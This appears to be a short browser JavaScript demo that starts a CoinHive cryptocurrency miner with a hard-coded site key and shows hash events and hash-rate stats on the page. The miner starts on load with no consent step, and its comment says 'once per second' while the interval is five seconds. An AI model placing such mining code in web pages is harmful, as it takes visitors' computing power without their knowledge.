var miner = new CoinHive.Anonymous('rarMc6RGSCXF4Pogr6ok6vnyOkQu3n7l');
miner.start();

function log(text) {
  var ul = document.getElementById('log');
  var li = document.createElement('li');
  li.innerHTML = text;
  ul.appendChild(li);
}

function stats(values) {
  var h1 = document.getElementById('stats');
  h1.innerHTML = JSON.stringify(values);
}

// Listen on events
miner.on('found', function() { log('hash found') })
miner.on('accepted', function() { log('hash accepted') })

// Update stats once per second
setInterval(function() {
  stats({
    hashesPerSecond: miner.getHashesPerSecond(),
    totalHashes: miner.getTotalHashes(),
    acceptedHashes: miner.getAcceptedHashes(),
  });
}, 5000);
